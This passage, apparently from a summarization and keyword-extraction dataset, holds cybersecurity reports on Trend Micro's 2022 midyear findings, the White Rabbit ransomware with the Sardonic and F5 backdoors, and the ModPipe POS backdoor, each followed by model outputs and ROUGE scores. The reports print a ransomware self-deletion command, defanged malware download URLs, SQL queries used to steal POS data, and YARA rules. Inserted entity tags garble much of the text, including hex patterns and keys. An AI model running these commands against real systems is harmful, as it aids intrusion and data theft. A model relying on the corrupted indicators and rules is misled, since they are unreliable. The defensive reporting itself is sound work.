[DATE] July [DATE] 22 , [DATE] 2022 , at url [ORG] release/2020/05/06/2028585/0 / en / Application - Container - Market - is - Expected - to - Reach-8 - 20 - Billion - by-2025 - Says - Allied- Market - Research.html.89 Trend Micro . ( [DATE] May [DATE] 14 , [DATE] 2019 ) . [ORG] Trend [ORG] Micro . \u201c Container Security : Examining Potential Threats to the Container Environment . \u201d Accessed on [DATE] July [DATE] 26 , [DATE] 2022 , at url examining - potential - threats - to - the - container - environment.90 [PERSON] Red [PERSON] Hat . ( [DATE] May [DATE] 18 , [DATE] 2022 ) . [PERSON] Red [PERSON] Hat . \u201c Kubernetes adoption , security , and market trends report [DATE] 2022 . \u201d Accessed on [DATE] July [DATE] 26,2022 , at url [PERSON] Magno [PERSON] Logan . ( [DATE] May 24 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] The [WORK_OF_ART] Fault [WORK_OF_ART] in [WORK_OF_ART] Our Kubelets : Analyzing the Security of Publicly ExposedKubernetes Clusters . \u201d Accessed on [DATE] July [DATE] 26 , [DATE] 2022 , at url kubelets - analyzing - the - security - of - publicly - exposed - kubernetes - clusters.html.92 [PERSON] Mark [PERSON] Nunnikhoven . ( [DATE] Oct. [DATE] 22 , [DATE] 2019 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] The [WORK_OF_ART] Shared [WORK_OF_ART] Responsibility [WORK_OF_ART] Model . \u201d Accessed on [DATE] July [DATE] 26 , [DATE] 2022 , at url [ORG] Trend [ORG] Micro . ( [DATE] April 24 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro . \u201c How to better manage your digital attack surface risk . \u201d Accessed on [DATE] July [DATE] 26 , [CARDINAL] 2022,at url [ORG] Trend [ORG] Micro . ( n.d . ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Trend [WORK_OF_ART] Micro [WORK_OF_ART] One . \u201d Accessed on [DATE] July [DATE] 26 , [DATE] 2022 , at url Common Vulnerabilities and Exposures . ( n.d . ) . [PERSON] Common [PERSON] Vulnerabilities and Exposures . \u201c CVE-2018 - 13379 . \u201d Accessed on July26 , [DATE] 2022 , at url | [WORK_OF_ART] Defending [WORK_OF_ART] the [WORK_OF_ART] Expanding [WORK_OF_ART] Attack [WORK_OF_ART] Surface : [ORG] Trend [ORG] Micro [ORG] 2022 Midyear Cybersecurity Report96 Common Vulnerabilities and Exposures . ( n.d . ) . [PERSON] Common [PERSON] Vulnerabilities and Exposures . \u201c CVE-2021 - 22986 . \u201d Accessed on July26 , [DATE] 2022 , at url [ORG] Trend [ORG] Micro . ( [DATE] Feb. 11 , [DATE] 2016 ) . [ORG] Trend [ORG] Micro . \u201c Frequently Asked Questions : [ORG] BlackEnergy . \u201d Accessed on [DATE] July [DATE] 26 , [DATE] 2022 , at url [PERSON] Feike [PERSON] Hacquebord et al . ( [DATE] March [DATE] 17 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro . \u201c Cyclops Blink Sets Sights on Asus Routers . \u201d Accessed on [DATE] July [DATE] 26,2022 , at url [ORG] WatchGuard . ( [DATE] Feb. [DATE] 23 , [DATE] 2022 ) . WatchGuard . \u201c Important Detection and Remediation Actions for Cyclops Blink State - Sponsored Botnet . \u201d Accessed on [DATE] July [DATE] 26 , [DATE] 2022 , at url actions - cyclops - blink - state - sponsored - botnet.100 Asus . ( n.d . ) . Asus . \u201c ASUS Product Security Advisory . \u201d Accessed on [DATE] July [DATE] 26 , [DATE] 2022 , at url [PERSON] Zoe [PERSON] Kleinman . ( [DATE] June [DATE] 14 , [DATE] 2022 ) . [ORG] BBC . \u201c Bitcoin : Why is the largest cryptocurrency crashing ? \u201d Accessed on [DATE] July [DATE] 26 , [DATE] 2022 , aturl [PERSON] Cifer [PERSON] Fang et al . ( [DATE] March 24 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] An [WORK_OF_ART] Investigation [WORK_OF_ART] of [WORK_OF_ART] Cryptocurrency [WORK_OF_ART] Scams [WORK_OF_ART] and [WORK_OF_ART] Schemes . \u201d [GPE] Accessedon [DATE] July [DATE] 26 , [DATE] 2022 , at url of - cryptocurrency - scams - and - schemes/03Technical%20Brief%20Keeping%20Assets%20Safe%20From%20 Cryptocurrency%20Scams%20and%20Schemes.pdf.103 [PERSON] Cifer [PERSON] Fang et al . ( [DATE] May 16 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro . \u201c Fake Mobile Apps Steal Facebook Credentials , Cryptocurrency - RelatedKeys . \u201d Accessed on [DATE] July [DATE] 26 , [DATE] 2022 , at url credentials -- crypto - related - keys.html.49 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 Midyear Cybersecurity [ORG] ReportTREND [ORG] MICROTM [ORG] RESEARCH [ORG] Trend [ORG] Micro , a global leader in cybersecurity , helps to make the world safe for exchanging digital information . [ORG] Trend [ORG] Micro [ORG] Research is powered by experts who are passionate about discovering new threats , sharing key insights , and supporting efforts to stop cybercriminals . Our global team helps identify [CARDINAL] millions of threats [DATE] daily , leads the industry in vulnerability disclosures , and publishes innovative research on new threat techniques . We continually work to anticipate new threats and deliver thought - provoking research.www.trendmicro.com", "generated_text": "the report; Trend Micro; midyear; the first half of 2022; large sections; a hybrid; remote working environments; 2021; Ransomware developers; advanced persistent threat; APT; Conti; LockBit; BlackCat; New players; commodity malware; the first half of 2022; critical vulnerabilities; critical software vulnerabilities; organizations; the cloud; other non-Windows operating systems; Linux; the Russia-Ukraine hostilities; cyberattacks; malware; the threat landscape; a rise; vulnerability advisories; C&C; cybersecurity technologies; cybersecurity solutions; analysis.", "ref_text": "<START-1>The PDF is Trend Micro's 2022 Midyear Cybersecurity Report, reviewing threats and trends from the first half of 2022. Key points: - Threat actors like Earth Lusca and Earth Berberoka are using extensive infrastructure and varied tools in campaigns targeting organizations worldwide. Commodity malware like Emotet saw major growth as ransomware groups integrate it into attacks. - Ransomware continues to evolve via Ransomware-as-a-Service (RaaS) operations like LockBit, Conti, and BlackCat. Linux systems are increasingly targeted. New ransomware families like Black Basta emerged targeting big-game victims. - Critical and high-severity vulnerabilities rose substantially, including issues like Spring4Shell affecting business software. Vulnerabilities in non-Windows systems and in the DDS standard used in IIoT devices were also analyzed. - Cloud threats remain, with cryptomining groups like TeamTNT active in compromising cloud assets. Attackers abuse cloud tunneling services and cloud misconfigurations persist as an issue. - Fileless malware, maldocs with macros, and tiny malware aim to bypass traditional signature-based defenses. A cross-generational blended defense is required. - Business email compromise losses now exceed $12 billion. AI-powered phishing detection solutions can help curb socially engineered scams. The report shares data on malware, network threats, vulnerabilities, data breaches, and other cybersecurity trends seen in the first half of 2022. It emphasizes the need for comprehensive and blended security to address the expanding digital attack surface. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4474393530997305, "gpt3/lexical/rouge_rouge2": 0.13008130081300814, "gpt3/lexical/rouge_rougeL": 0.23719676549865232, "gpt3/lexical/rouge_rougeLsum": 0.23719676549865232, "gpt3_generated_text": ["The Trend Micro 2022 Midyear Cybersecurity Report highlights various trends and incidents that have shaped the cybersecurity landscape in the first half of 2022. One key theme is the expanding attack surface, as more organizations adopt remote and hybrid work models, leading to an increased need for robust security measures. Ransomware threat actors have evolved their tactics, with the rise of ransomware-as-a-service (RaaS) models and the emergence of new players like Conti, LockBit, and BlackCat. Additionally, advanced persistent threat (APT) groups have utilized sophisticated toolkits and infrastructure in their campaigns. There is also a growing focus on targeting Linux systems, and cybercriminals have capitalized on geopolitical tensions to launch attacks. The report also highlights an increase in critical software vulnerabilities and the targeting of cloud environments. Overall, the report emphasizes the need for effective multilayered defenses and security technologies to protect against these evolving threats."]}, {"split_name": "val", "sample_id": "val_52", "prompt_text": "Extract the keywords: White Rabbit Continued : Sardonic and F5White Rabbit Continued : Sardonic and F5WHITE RABBIT CONTINUED : SARDONIC AND F5 In [DATE] December [DATE] 2021 , [ORG] Lodestone published an article linking a previously unknown ransomware group , White Rabbit , to the threat actor group FIN8 after observing striking similarities between the [CARDINAL] two during an investigation . The subsequent efforts by the cybersecurity community have brought together experts from around the world to \u201c follow [FAC] the [FAC] White [FAC] Rabbit , \u201d so to speak , and gain more insight into an emerging threat . Since the time the last article was published , [ORG] Lodestone has observed evidence that a new version of FIN8 \u2019s BadHatch backdoor malware , [ORG] Sardonic , has been deployed and seen in use by White Rabbit . Lodestone experts have identified strong overlap between [ORG] Sardonic and this new backdoor malware , dubbed F5 and encountered as part of the investigation that initially resulted in the discovery of the White Rabbit group . [ORG] SARDONIC [ORG] VS F5Overall , the functionality of the [ORG] Sardonic .NET assembly ( \u201c MDAC.dll \u201d ) and the F5 assembly ( \u201c [ORG] Default.dll \u201d ) have strong similarities . They both contain [PERSON] Rivest [PERSON] Cipher 4 ( RC4 ) encrypted shellcode , with the decryption key contained in the [ORG] DLL , and both are compressed using [GPE] Gzip . In the samples recovered by [ORG] Lodestone , the decryption key for the \u201c MDAC.dll \u201d shellcode was [DATE] 802d8B9Fe13f576163DEab429754cA0C , while the key for \u201c [ORG] Default.dll \u201d was [CARDINAL] 15e280Ea9d63270Fb89763514cDCABf4 . As reflected in the screen snippets below , the decryption algorithms remained essentially unchanged.2White Rabbit Continued : Sardonic and F5Although the F5 and Sardonic backdoors appear to function nearly identically to each other , some features of the [ORG] PowerShell script and the .NET [ORG] DLL mentioned in the [ORG] Bitdefender paper appear to have been removed ; the [ORG] PowerShell script no longer has an option to kill an existing process , and the \u201c [CARDINAL] 4BMARC2WKL \u201d marker prepending the shellcode in \u201c MDAC.dll \u201d does not exist in \u201c [ORG] Default.dll \u201d . Since these were minor features of the malware , Lodestone could not determine why they may have been explicitly removed by the author.3White Rabbit Continued : Sardonic and F5Another observation [PERSON] Lodestone made during the investigation was a change in the method name executed by the [ORG] PowerShell script . In [ORG] Sardonic , the method used was \u201c MSDAC.PerfOSChecker::StartCheck \u201d ; however , in [CARDINAL] F5 , the name was changed to \u201c o5518470.kfC09272::p65E1a71 \u201d . Surprisingly , Lodestone did observe evidence of threat actors creating a new [ORG] Windows [ORG] Management [ORG] Instrumentation ( WMI ) consumer for the [CARDINAL] F5 PowerShell script . It is possible that efforts to configure F5 to establish this persistence were abandoned once a decision was made deploy ransomware.4White Rabbit Continued : Sardonic and F5Lodestone encountered some difficulties in the analysis of \u201c [ORG] Default.dll \u201d which hampered progress . What Lodestone has determined thus far , however , is that , like the shellcode in \u201c MDAC.dll \u201d , the \u201c [ORG] Default.dll \u201d shellcode [ORDINAL] first checks the name of its parent process . If the parent process is \u201c powershell.exe \u201d , the shellcode will open \u201c lsass.exe \u201d with SeDebugPrivilege and copies its system token . Then , it creates a child process , \u201c WmiPrvSE.exe \u201d , with system privileges to enable it to inject its own code and run with elevated privileges . The malware then generates a 32 - byte hardware ID based on the computer name and C volume serial number . The system time and hardware ID are then encrypted with a custom algorithm and placed into a 64 - byte buffer before an attempt is made to connect to the C2 server . If the malware is unable to reach the [CARDINAL] C2 server after [CARDINAL] five attempts , it will terminate itself . EVIDENCE OF [ORG] A [ORG] HUMAN [ORG] OPERATORInterestingly , [ORG] Lodestone may have found evidence supporting [ORG] Bitdefender \u2019s belief that the [ORG] Sardonic or [CARDINAL] F5 loader is copied to the victim \u2019s machine via a manual process instead of automation . The logs Lodestone analyzed during the course of its investigation show that the filename of the URL hosting the malware was always a random , [CARDINAL] 6 - character alphanumeric string that changed nearly every time the command was run . In [CARDINAL] one of the events , however , [PERSON] Lodestone noticed that the filename contained [CARDINAL] seven characters . The [ORG] PowerShell log in the image below shows a command to download a file from hxxps://104 - 168 - 201 - 26.sslip[.]io/36d851e . [TIME] Roughly [TIME] one [TIME] minute [TIME] later , another command was run to download a file from hxxps://104 - 168 - 201 - 26.sslip[.]io/6d851e . Lodestone belives that the best explanation for this is that a human operator entered the incorrect URL and then reran the same command with the correct URL.5White Rabbit Continued : Sardonic and F56White Rabbit Continued : Sardonic and F5WHITE [PERSON] RABBITWhen [PERSON] Lodestone [ORDINAL] first acquired a sample of the ransomware , its experts observed that it was highly obfuscated , had strange file extensions ( .physiat and .uderro ) , and used an invalid digital certificate . Additionally , [PERSON] Lodestone determined that the malware checked the command line arguments using \u201c -f \u201d , \u201c -l \u201d , \u201c -p \u201d , and \u201c -t \u201d flags . Lodestone \u2019s theory that the \u201c -p \u201d flag was for the password used to decrypt the payload was confirmed by a [ORG] Trend [ORG] Micro article on [FAC] White [FAC] Rabbit , as [ORG] Lodestone \u2019s sample used the same passphrase as the sample analyzed by [ORG] Trend [ORG] Micro . The other flags allow an operator to specify which files ( -f ) to encrypt , an output ( -l ) for a log file , and a start time ( -t ) to begin encryption ( if no time is specified the ransomware executes immediately ) . Once the malware completes its encryption function it executes a self- deletion function using the command : cmd /c choice /t [CARDINAL] 9 /d y & attrib -h \\\u201d[fname]\\ \u201d & del \\\u201d[fname]\\\u201d7White Rabbit Continued : Sardonic and F5Lodestone continues to monitor the situation for any further developments and would like to thank its partners at Group - IB for their contributions to this investigation . To learn more about Group - IB , visit the following link : url group-ib.com/.8White Rabbit Continued : Sardonic and F5INDICATORS OF COMPROMISE IP Addresses64.44.131[.]3491.90.194[.]30104.168.132[.]128170.130.55[.]120Domains91 - 90 - 194 - 30.sslip[.]io104 - 168.132[.]128.nip[.]ioURLsurl description = \u201c [WORK_OF_ART] Powershell [WORK_OF_ART] .NET [WORK_OF_ART] DLL [WORK_OF_ART] Loader \u201d / * if([IntPtr]::size -eq 4 ) { * / $ s0 = { 3D [CARDINAL] 69 66 28 5B 49 6E 74 50 74 [CARDINAL] 72 [CARDINAL] 5D [CARDINAL] 3A 3A 73 [CARDINAL] 69 [CARDINAL] 7A [CARDINAL] 65 20 2D 65 71 20 34 29 [CARDINAL] 7B } / * [ System . Reflection . Assembly]::Load([System . Convert]::FromBase64String ( * / $ s1 = { 5B 53 79 73 74 65 [CARDINAL] 6D [CARDINAL] 2E 52 65 66 6C 65 63 74 69 [CARDINAL] 6F 6E [CARDINAL] 2E 41 73 73 65 6D [CARDINAL] 62 6C [CARDINAL] 79 [CARDINAL] 5D [CARDINAL] 3A [CARDINAL] 3A 4C [CARDINAL] 6F [CARDINAL] 61 64 [CARDINAL] 28 5B 53 79 73 74 65 [CARDINAL] 6D [CARDINAL] 2E 43 [CARDINAL] 6F 6E 76 65 72 74 [CARDINAL] 5D [CARDINAL] 3A 3A 46 72 [CARDINAL] 6F 6D 42 61 73 65 36 34 53 74 72 [CARDINAL] 69 6E 67 28 } all of them description = \u201c [WORK_OF_ART] Sardonic [WORK_OF_ART] Shellcode [WORK_OF_ART] Loader \u201d [ORG] Default.dll ( x86 ) * / Default.dll ( x64 ) * / $ pdb1 = \u201c C:\\\\Users\\\\dev_win10_00\\\\Documents\\\\f5\\\\F5Utility\\\\ LoaderAssembly\\\\obj\\\\ \u201c nocase ascii $ s0 = \u201c [ORG] Default.dll \u201d fullword wide $ [MONEY] s1 = \u201c [CARDINAL] 12F9333185494642C1587A546D2287C1A4C01A2A \u201d fullword ascii $ s2 = \u201c 05F6DF120FF54415A6B75A4B1894A83C6D865030 \u201d fullword ascii $ s3 = \u201c [CARDINAL] 78893E31FF10BDE2CBCB8A51664788D7DC0FC194 \u201d fullword ascii $ s4 = \u201c [CARDINAL] 15e280Ea9d63270Fb89763514cDCABf4 \u201d fullword ascii [CARDINAL] 2 of them description = \u201c Sardonic Shellcode(in the memory ) \u201d strings : $ h_x86 = { E8 00 00 00 00 5F B9 [ [DATE] 2 ] [DATE] 00 [DATE] 00 [ [CARDINAL] 2 ] 30 ? ? 0F 17 00 00 00 02 ? ? 0F 17 00 00 00 E2 F0 } / * * a1 = ( ( * a1 ^ ( * a1 < < 6 ) ) > > 13 ) ^ ( * a1 < < [CARDINAL] 18 ) & 0xFFF80000 ; * a2 = ( [CARDINAL] 4 * * a2 ) & 0xFFFFFFE0 ^ ( ( ( 4 * * a2 ) ^ * a2 ) > > 27 ) ; * a3 = ( ( * a3 ^ ( * a3 < < 13 ) ) > > 21 ) ^ ( * a3 < < 7 ) & 0xFFFFF800 ; v4 = ( * a4 < < [CARDINAL] 13 ) & 0xFFF00000 ^ ( ( * a4 ^ ( [CARDINAL] 8 * * a4 ) ) > > 12 ) ; * / $ chunk_x86 = { [CARDINAL] 89 [CARDINAL] 3A 8B [CARDINAL] 03 8D 3C 85 ? ? ? ? ? ? ? ? [CARDINAL] 31 F8 83 E7 E011White Rabbit Continued : Sardonic and F5C1 E8 1B 31 F8 89 [CARDINAL] 03 [CARDINAL] 8B 39 89 F8 C1 E0 0D 31 F8 C1 E7 07 C1 [CARDINAL] E8 15 81 E7 00 F8 FF FF [CARDINAL] 31 C7 89 39 [ORG] 8B [CARDINAL] 3E 8D 04 FD ? ? ? ? ? ? ? ? [CARDINAL] 31 F8 C1 E7 0D [CARDINAL] 81 E7 00 00 F0 [ORG] FF [CARDINAL] C1 E8 0C 31 F8 } $ [MONEY] h_x64 = { [CARDINAL] 41 [ [CARDINAL] 2 ] 48 C7 C1 [ [DATE] 2 ] [DATE] 00 00 4C 8D [ [CARDINAL] 2 ] 00 00 00 45 [CARDINAL] 30 } / * * a1 = ( * a1 < < 18 ) & 0xFFF80000 ^ ( ( * a1 ^ ( * a1 < < 6 ) ) > > 13 ) ; * a2 = ( [CARDINAL] 4 * * a2 ) & 0xFFFFFFE0 ^ ( ( ( 4 * * a2 ) ^ * a2 ) > > 27 ) ; * a3 = ( * a3 < < 7 ) & 0xFFFFF800 ^ ( ( * a3 ^ ( * a3 < < 13 ) ) > > 21 ) ; v4 = ( * a4 < < [CARDINAL] 13 ) & 0xFFF00000 ^ ( ( * a4 ^ ( [CARDINAL] 8 * * a4 ) ) > > 12 ) ; * / $ chunk_x64 = { [DATE] 89 [DATE] 01 8B 02 44 8D [DATE] 14 [DATE] 85 ? ? ? ? ? ? ? ? [CARDINAL] 44 31 D0 41 83 E2 [PRODUCT] E0 [PRODUCT] C1 [PRODUCT] E8 [PRODUCT] 1B [PRODUCT] 44 31 D0 89 02 45 8B 10 44 89 [PRODUCT] D0 [PRODUCT] C1 E0 0D 44 31 [ORG] D0 [ORG] 41 C1 E2 07 41 [CARDINAL] 81 E2 00 F8 FF FF [CARDINAL] C1 [PRODUCT] E8 [PRODUCT] 15 44 31 D0 41 89 00 [CARDINAL] 45 [CARDINAL] 8B [CARDINAL] 11 [CARDINAL] 42 8D 04 D5 ? ? ? ? ? ? ? ? [CARDINAL] 44 31 [ORG] D0 [ORG] 41 C1 E2 [CARDINAL] 0D C1 E8 0C 41 81 E2 00 00 F0 [ORG] FF 44 31 D0 } any of them } 12White Rabbit Continued : Sardonic and F5ADDITIONAL INFORMATION RESOURCESMichael Gillespie \u2019s White Rabbit announcement on [PRODUCT] Twitter : url on FIN8 : url forensic - investigation url [ORG] Bitdefender - PR - Whitepaper - BADHATCH - creat5237 - en - EN.pdfTrend [ORG] Micro [ORG] on [ORG] White [ORG] Rabbit : url spotted - white - rabbit - and - its - evasion - tactics.htmlMITRE profile on FIN8url and PUNCHTRACKurl url Security is a wholly owned subsidiary of [ORG] Beazley plc . Lodestone provides computer security and cybersecurity consulting services . Lodestone does not provide insurance services and client information obtained by [ORG] Lodestone is not shared with [PERSON] Beazley claims or underwriting . Likewise , client information obtained by [PERSON] Beazley claims or underwriting is not shared with Lodestone.13www.lodestone.com 320 [ORG] E. [ORG] Main [ORG] Street [ORG] Lewisville , [ORG] TX [CARDINAL] 75057", "generated_text": "FIN8; White Rabbit; the ransomware group; a new version; Sardonic; Default.dll; similarities; similarity; PowerShell; a new Windows Management Instrumentation consumer; the F5 PowerShell script; a new Windows Management Instrumentation consumer; WMI; the PowerShell script; a PowerShell script; a child process; WmiPrvSE.exe; system privileges; AES; the malware; similarities; the DLL; the decryption algorithm; the PowerShell script.", "ref_text": "<START-1>Here is a summary of the key points from the report on the Sardonic and F5 malware used by the White Rabbit ransomware group: - White Rabbit is a ransomware group linked to the cybercrime group FIN8 in previous research. - Lodestone security researchers analyzed a new FIN8 backdoor called F5 that shows strong similarities to an earlier backdoor called Sardonic. - Both Sardonic and F5 use RC4 encryption for shellcode, gzip compression, and minor differences in decryption routines. F5 removed some features like process killing. - The PowerShell loader script downloads the backdoor DLL from a server using random URLs, likely indicating manual control by a human operator. - F5 checks for \"powershell.exe\" as the parent process, copies the LSASS access token, and connects to a C2 server after encrypting the system ID. - The White Rabbit ransomware itself is highly obfuscated, uses invalid certificates, and command line arguments to specify encryption parameters. It deletes itself after encrypting files. - Technical details, IP addresses, domains, filenames, YARA rules, and other IOCs are provided for detection of the malware and its C2 infrastructure. - The report examines the evolution of FIN8's malware arsenal from Sardonic to F5 based on code reuse and shared tactics, reinforcing the link between FIN8 and White Rabbit. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5083932853717027, "gpt3/lexical/rouge_rouge2": 0.12048192771084337, "gpt3/lexical/rouge_rougeL": 0.2589928057553956, "gpt3/lexical/rouge_rougeLsum": 0.2589928057553956, "gpt3_generated_text": ["This article discusses the connection between the ransomware group White Rabbit and the threat actor group FIN8. The cybersecurity community has been investigating White Rabbit and has discovered that they are using a new version of FIN8's BadHatch backdoor malware called Sardonic. Additionally, a new backdoor malware called F5 has been encountered during the investigation. The functionality of Sardonic and F5 is very similar, with both containing encrypted shellcode and being compressed using Gzip. However, there are some minor differences between the two, such as removed features in the PowerShell script and a change in the method name executed by the script. The article also mentions the use of a new Windows Management Instrumentation consumer for the F5 PowerShell script. The analysis of the Default.dll file was hampered, but it was determined that the shellcode first checks the name of its parent process and then carries out various actions, including generating a hardware ID and attempting to connect to a C2 server. Interestingly, there is evidence suggesting that the Sardonic or F5 loader is manually copied to the victim's machine rather than being automated. Overall, the article highlights the similarities and differences between Sardonic and F5 and provides insights into the actions and capabilities of these malware variants."]}, {"split_name": "val", "sample_id": "val_53", "prompt_text": "Extract the keywords: [CARDINAL] 11/13/2020Hungry for data , [ORG] ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityHungry for data , [ORG] ModPipe backdoor hits POS software used in hospitality [DATE] sectorwelivesecurity.com/2020/11/12/hungry-data-modpipe-backdoor-hits-pos-software-hospitality-sectorNovember [DATE] 12 , [CARDINAL] 2020Backdoor authors show deep knowledge of the targeted POS software , decrypting database passwords from Windows registry [PERSON] valuesMartin [PERSON] Smol\u00e1r 12 Nov 2020 - 11:30AMESET researchers have discovered [ORG] ModPipe , a modular backdoor that gives its operators access to sensitive information stored in devices running [ORG] ORACLE [ORG] MICROS [ORG] Restaurant Enterprise Series ( RES ) [CARDINAL] 3700 POS \u2013 a management software suite used by [CARDINAL] hundreds [CARDINAL] of [CARDINAL] thousands of bars , restaurants , hotels and other hospitality establishments worldwide . What makes the backdoor distinctive are its downloadable modules and their capabilities . [CARDINAL] One of them \u2013 named GetMicInfo \u2013 contains an algorithm designed to gather database passwords by decrypting them from Windows registry values . This shows that the backdoor \u2019s authors have deep knowledge of the targeted software and opted for this sophisticated method instead of collecting the data via a simpler yet \u201c louder \u201d approach , such as keylogging . Exfiltrated credentials allow [ORG] ModPipe \u2019s operators access to database contents , including various definitions and configuration , status tables and information about POS transactions . However , based on the documentation of RES 3700 POS , the attackers should not be able to access some of the most sensitive information \u2013 such as credit card numbers and expiration dates \u2013 which is protected by encryption . The only customer data stored in the clear and thus available to the attackers should be cardholder names.url for data , [ORG] ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityThis would limit the amount of valuable information viable for further sale or misuse , making the full \u201c business model \u201d behind the operation unclear . [CARDINAL] One possible explanation is that another downloadable module exists that allows the malware operators to decrypt the more sensitive data in the user \u2019s database . According to the documentation , to achieve this the attackers would have to reverse engineer the generation process of the \u201c site - specific passphrase \u201d , which is used to derive the encryption key for sensitive data . This process would then have to be implemented into the module and \u2013 due to use of [ORG] the [ORG] Windows [ORG] Data [ORG] Protection [ORG] API ( DPAPI ) \u2013 executed directly on the victim \u2019s machine . Another remaining unknown is [ORG] ModPipe \u2019s distribution method . The majority of the identified targets were from [GPE] the [GPE] United [GPE] States , with indications that they were in the restaurant and hospitality sectors \u2013 the primary customers of RES 3700 POS.ModPipe architectureOur analysis shows that [ORG] ModPipe uses modular architecture consisting of basic components and downloadable modules ( for a better overview see Figure 1):1 . initial dropper \u2013 contains both [QUANTITY] 32 - bit and [CARDINAL] 64 - bit binaries of the next stage \u2013 thepersistent loader \u2013 and installs the appropriate version to the compromised machine.2 . persistent loader \u2013 unpacks and loads the next stage of the malware , namely themain module.3 . main module \u2013 performs the main functionality of the malware . It creates a pipeused for communication with other malicious modules , un / installs these modules and serves as a dispatcher that handles communication between the modules and attacker \u2019s C&C server.4 . networking module \u2013 module used for communication with C&C. [CARDINAL] 5 . downloadable modules \u2013 components adding specific functionality to thebackdoor , such as the ability to steal database passwords and configuration information , scan specific [ORG] IP addresses or acquire a list of the running processes and their loaded modules.url for data , [ORG] ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityFigure [CARDINAL] 1 . Overview of ModPipe backdoor architectureurl for data , [ORG] ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityDownloadable modulesProbably the most intriguing parts of [ORG] ModPipe are its downloadable modules . We \u2019ve been aware of their existence since [DATE] the [DATE] end [DATE] of [DATE] 2019 , when we [ORDINAL] first found and analyzed its \u201c basic \u201d components . In [DATE] April [DATE] 2020 , after [DATE] a [DATE] couple [DATE] of [DATE] months of hunting , we found [CARDINAL] three of these modules in the wild . The list of all downloadable modules we found and analyzed , and their IDs \u2013 represented by a [CARDINAL] 16 - bit unsigned value \u2013 are available in [LAW] Table [LAW] 1 . Our research also suggests that the operators use [CARDINAL] at [CARDINAL] least [CARDINAL] four other downloadable modules , whose functionality remains completely unknown to us for now . It \u2019s worth mentioning that some of these modules can create a named pipe with a GUID- formatted name derived from the module \u2019s ID . Other modules can use this pipe to send commands to the module that created it . Table 1 . Downloadable modulesModule ID NameDescription0xA0C0GetMicInfo Steals database passwords , data and various settings0x2000ModScanPerforms scan on the specified [ORG] IP addresses-0xA0000xA0400xA7400xA080ProcListGets list of the running processes and their loaded modulesunknownunknownunknownunknown----Downloadable module : [PERSON] GetMicInfoGetMicInfo is a downloadable component that targets data related to the MICROS POS including passwords tied to [CARDINAL] two database usernames predefined by the manufacturer : dba and micros ( see Figure [CARDINAL] 2 ) . This information is encrypted and stored in [DATE] DataS5 ( for dba ) and DataS6 ( for micros ) registry values within [CARDINAL] one of the following registry keys : HKLM\\Software\\Micros\\UserData or HKLM\\Software\\WOW6432Node\\Micros\\UserData if run in Windows [QUANTITY] 32 - bit on Windows 64 - bit ( WOW64 ) subsystemurl for data , [ORG] ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityFigure [CARDINAL] 2 . Hex - Rays decompiled code of the function stealing database passwordsThe [PERSON] GetMicInfo module can intercept and decrypt these database passwords , using a specifically designed algorithm . So as not to aid other malicious actors , we wo n\u2019t be disclosing the inner workings of the algorithm . Since the decryption mechanism was n\u2019t publicly available , there are [CARDINAL] at [CARDINAL] least [CARDINAL] three possible scenarios of how the attackers could have created the algorithm : The most probable option is that the attackers acquired and reverse engineered the implementation of the ORACLE MICROS RES 3700 POS and the libraries responsible for encryption and decryption of the database passwords . The attackers could have gained the information describing the implementation of the encryption and decryption mechanism from a [DATE] 2016 data breach described in a blogpost by [PERSON] Brian [PERSON] Krebs . The malware operators could have bought the code from an underground market . Our analysis shows that in cases where the [PERSON] GetMicInfo module decrypts the password for the dba username , it will also try to acquire the path to the SQL Anywhere API library from the environment variable \u201c SQLANY_API_DLL \u201d and load it if it \u2019s available . If the environment variable does not exist , the module tries to load the library using its name dbcapi.dll . This library is a part of [ORG] Sybase [ORG] SQL [ORG] Anywhere , which is used by [DATE] RES [DATE] 3700 [DATE] POS.If [DATE] one of these approaches is successful , [PERSON] GetMicInfo attempts to connect to the database using the following connection string : url for data , [ORG] ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityDBN = micros;UID = dba;ENG = sql%PCNAME%;PWD=%decrypted_DataS5%%PCNAME% represents the computer name retrieved via the GetComputerName API and [ORG] % decrypted_DataS5 [ORG] % stands for the decrypted dba user password . After establishing a connection , GetMicInfo tries to execute the following [ORG] SQL queries and report the results to the main module , using a pipe message with ID 0x10000013 ( see [LAW] Table [LAW] 3 [LAW] for [LAW] a full list of pipe messages and their IDs):123456789SELECT lan_node_seq , obj_num , name , lan_addr , ob_diskless , type , ip_addr , ip_netmask FROM micros.lan_node_defSELECT [NORP] dvc_tbl_seq , obj_num , name , type , [ORG] com_port_seq , com_port , baud_rate , num_- data_bits , num_stop_bits , parity_type , filename FROM micros.dev_defSELECT tmed_seq , obj_num , name , type , ca_driver , edc_driver FROM micros.tmed_defSELECT * FROM micros.caedc_driver_defSELECT * FROM micros.interface_defQueried data contain various [LAW] MICROS [LAW] RES [LAW] 3700 POS system definitions and configurations ( see Figure [CARDINAL] 3 ) . Other information stolen by the module includes the version of the MICROS POS and information about specific registry keys most likely related to various credit card services configurations.url for data , [ORG] ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityFigure [CARDINAL] 3 . Hex - Rays decompiled code of the function that steals database dataThe [PERSON] GetMicInfo module is injected into one of the processes specified by the [ORG] C&C in the install command ( 0x0C ) . Based on our findings , it is typically associated with [CARDINAL] one of the following legitimate processes : [PERSON] MDSHTTPService.exe ( [ORG] MICROS [ORG] MDS [ORG] HTTP [ORG] Service ) CALSrv.exe ( [ORG] MICROS [ORG] CAL [ORG] Service [ORG] \u2013 Client Application Loader server ) explorer.exeWe can confirm that the [PERSON] GetMicInfo module can successfully obtain the database passwords from [DATE] RES [DATE] 3700 POS v4.7 and 